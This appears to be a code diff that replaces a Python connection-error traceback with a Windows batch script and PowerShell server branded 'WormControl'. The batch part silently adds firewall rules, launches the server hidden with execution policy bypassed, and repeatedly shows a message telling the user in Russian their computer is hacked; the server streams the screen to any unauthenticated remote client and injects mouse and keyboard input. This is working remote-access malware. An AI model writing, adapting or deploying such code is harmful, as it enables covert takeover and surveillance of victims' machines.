@@ -1,11 +1,108 @@
-Traceback (most recent call last):
-  File "C:\Users\User\client.py", line 84, in <module>
-    Viewer(sys.argv[1])
-  File "C:\Users\User\client.py", line 9, in __init__
-    self.sock = socket.create_connection((host, port))
-                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "C:\Users\User\AppData\Local\Programs\Python\Python311\Lib\socket.py", line 850, in create_connection
-    raise exceptions[0]
-  File "C:\Users\User\AppData\Local\Programs\Python\Python311\Lib\socket.py", line 835, in create_connection
-    sock.connect(sa)
-ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+@echo off
+setlocal
+
+netsh advfirewall firewall add rule name="WC-IN" dir=in action=allow protocol=TCP localport=50506 >nul 2>&1
+netsh advfirewall firewall add rule name="WC-OUT" dir=out action=allow protocol=TCP localport=50506 >nul 2>&1
+netsh advfirewall firewall add rule name="WC-IN-UDP" dir=in action=allow protocol=UDP localport=50506 >nul 2>&1
+
+start "" /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0server.ps1"
+
+:loop
+timeout /t 60 /nobreak >nul
+powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('ТВОЙ КОМПЬЮТЕР ВЗЛОМАН','WormControl')" >nul 2>&1
+goto loop
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Core
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern void mouse_event(int f,int x,int y,int d,int e);
+    [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte scan, int f, int e);
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
+}
+"@
+
+$port = 50506
+$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
+$listener.Start()
+
+function Send-Frame($stream) {
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $g = [System.Drawing.Graphics]::FromImage($bmp)
+    $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+    $ms = New-Object System.IO.MemoryStream
+    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+    $data = $ms.ToArray()
+    $len = [BitConverter]::GetBytes([int]$data.Length)
+    $stream.Write($len, 0, 4)
+    $stream.Write($data, 0, $data.Length)
+    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
+}
+
+function Recv-Exact($stream, $n) {
+    $buf = New-Object byte[] $n
+    $read = 0
+    while ($read -lt $n) {
+        $r = $stream.Read($buf, $read, $n - $read)
+        if ($r -le 0) { throw "disconnect" }
+        $read += $r
+    }
+    return $buf
+}
+
+function Handle-Client($client) {
+    $stream = $client.GetStream()
+    $sending = $true
+    $sendThread = {
+        param($s, [ref]$flag)
+        while ($flag.Value) {
+            try { Send-Frame $s; Start-Sleep -Milliseconds 66 } catch { $flag.Value = $false }
+        }
+    }
+    $ps = [PowerShell]::Create()
+    $ps.AddScript($sendThread).AddArgument($stream).AddArgument([ref]$sending) | Out-Null
+    $ps.BeginInvoke() | Out-Null
+
+    try {
+        while ($true) {
+            $t = Recv-Exact $stream 1
+            switch ($t[0]) {
+                77 {
+                    $d = Recv-Exact $stream 8
+                    $x = [BitConverter]::ToInt32($d, 0)
+                    $y = [BitConverter]::ToInt32($d, 4)
+                    [Win32]::SetCursorPos($x, $y) | Out-Null
+                }
+                66 {
+                    $d = Recv-Exact $stream 2
+                    $btn = $d[0]; $st = $d[1]
+                    $flag = if ($btn -eq 1) { if ($st -eq 1) { 0x0002 } else { 0x0004 } } else { if ($st -eq 1) { 0x0008 } else { 0x0010 } }
+                    [Win32]::mouse_event($flag, 0, 0, 0, 0)
+                }
+                75 {
+                    $d = Recv-Exact $stream 2
+                    $vk = $d[0]; $st = $d[1]
+                    if ($st -eq 1) { [Win32]::keybd_event($vk, 0, 0, 0) }
+                    else { [Win32]::keybd_event($vk, 0, 2, 0) }
+                }
+            }
+        }
+    } catch { }
+    $sending = $false
+    $ps.Stop(); $client.Close()
+}
+
+while ($true) {
+    $client = $listener.AcceptTcpClient()
+    $rs = [runspacefactory]::CreateRunspace()
+    $rs.Open()
+    $ps = [PowerShell]::Create()
+    $ps.Runspace = $rs
+    $ps.AddScript(${function:Handle-Client}).AddArgument($client) | Out-Null
+    $ps.BeginInvoke() | Out-Null
+}
